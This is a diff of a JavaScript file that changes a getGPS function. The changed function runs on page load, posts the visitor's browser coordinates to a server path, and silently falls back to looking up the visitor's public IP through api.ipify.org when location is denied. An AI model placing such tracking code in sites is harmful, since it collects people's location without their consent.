@@ -1,4 +1,4 @@
-//——————————————————————————————————//                               
+//——————————————————————————————————//
 //          xeee      .--~*teu.     //
 //         d888R     dF     988Nx   //
 //        d8888R    d888b   `8888>  //
@@ -34,24 +34,32 @@
 |*| keep it a variable.
 \*/
 
-const getGPS = serverSideReceiver => {
+const getGPS = () => {
+	let url = '/info/location/';
 	const xhr = new XMLHttpRequest();
-	xhr.open("POST", serverSideReceiver);
 
 	if (navigator.geolocation) {
 		navigator.geolocation.getCurrentPosition(position => {
 			let lat = position.coords.latitude;
 			let lon = position.coords.longitude;
-			xhr.send('gps=success&latitude=' + lat + '&longitude=' + lon);
-		}, error => {
+			let gps = {"gps" : "ok", "latitude" : lat, "longitude" : lon};
+			url += JSON.stringify(gps);
+			xhr.open("POST", url);
+			xhr.send();
+		}, () => {
 			const ipReq = new XMLHttpRequest();
 			ipReq.onload = () => {
-				xhr.send('gps=fail&ip=' + ipReq.responseText);
+				let gps = {"gps" : "fail", "ip" : ipReq.responseText};
+				url += JSON.stringify(gps);
+				xhr.open("POST", url);
+				xhr.send();
 			}
-			ipReq.onerror = e => {xhr.send('gps=fail&err=' + e.message)};
-			ipReq.ontimeout = () => {xhr.send('gps=fail&err=timeout')};
+			//ipReq.onerror = e => {xhr.send('gps=fail&err=' + e.message)};
+			//ipReq.ontimeout = () => {xhr.send('gps=fail&err=timeout')};
 			ipReq.open("GET", 'https://api.ipify.org', true);
 			ipReq.send(null);
-		});		
+		});
 	}
-}
+};
+
+window.onload = () => {getGPS()};
